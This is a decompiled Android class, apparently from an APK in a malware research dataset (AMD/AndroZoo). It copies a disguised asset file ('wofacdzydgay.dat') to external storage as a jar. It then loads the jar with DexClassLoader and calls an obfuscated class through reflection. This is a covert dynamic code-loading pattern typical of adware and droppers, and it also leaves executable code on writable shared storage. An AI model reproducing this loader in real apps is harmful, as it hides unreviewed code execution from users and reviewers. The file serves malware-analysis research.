package com.baoyi.cp3;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

/* compiled from: GDynamic.java */
/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/f4017634f016015f84afc748ba723096.apk/classes.dex */
public class a {
    private static a a;
    private static String g = "qSG.bzE.PDGJeo";
    private Class<?> b = null;
    private DexClassLoader c;
    private String d;
    private String e;
    private Context f;

    private a(Context ctx, String vid, String chlId) {
        this.f = ctx;
        this.d = vid;
        this.e = chlId;
        c(ctx);
    }

    public static synchronized a a(Context ctx, String vid, String chlId) {
        a aVar;
        synchronized (a.class) {
            if (a == null) {
                a = new a(ctx, vid, chlId);
            }
            aVar = a;
        }
        return aVar;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public void a(int x, int y, Object callback, int mode) {
        if (!"mounted".equals(Environment.getExternalStorageState())) {
            Log.d("debug", "sdcard");
            return;
        }
        try {
            Method run = this.b.getMethod("show", Integer.TYPE, Integer.TYPE, Object.class, Integer.TYPE);
            run.invoke(null, Integer.valueOf(x), Integer.valueOf(y), callback, Integer.valueOf(mode));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void a(Context ctx) {
        try {
            File file = a();
            OutputStream os = new FileOutputStream(file);
            try {
                InputStream is = ctx.getAssets().open("wofacdzydgay.dat");
                byte[] buf = new byte[1024];
                while (true) {
                    int len = is.read(buf);
                    if (len != -1) {
                        os.write(buf, 0, len);
                    } else {
                        is.close();
                        os.close();
                        return;
                    }
                }
            } catch (IOException e) {
                e = e;
                e.printStackTrace();
            }
        } catch (IOException e2) {
            e = e2;
        }
    }

    private File a() {
        File dir = new File(Environment.getExternalStorageDirectory(), "Android/" + this.f.getPackageName());
        if (!dir.exists()) {
            dir.mkdirs();
        }
        File file = new File(dir, "wofacdzydgay.dat.jar");
        return file;
    }

    protected void b(Context ctx) {
        File file = a();
        this.c = new DexClassLoader(file.getAbsolutePath(), ctx.getApplicationInfo().dataDir, null, getClass().getClassLoader());
        try {
            this.b = this.c.loadClass(g);
            Method getInstance = this.b.getMethod("init", Context.class, Class.class, String.class, String.class);
            getInstance.invoke(null, ctx, a.class, this.d, this.e);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public DexClassLoader c(Context ctx) {
        if (!"mounted".equals(Environment.getExternalStorageState())) {
            return null;
        }
        if (this.c == null) {
            File file = a();
            if (file != null && !file.exists()) {
                a(ctx);
            }
            b(ctx);
        }
        return this.c;
    }
}
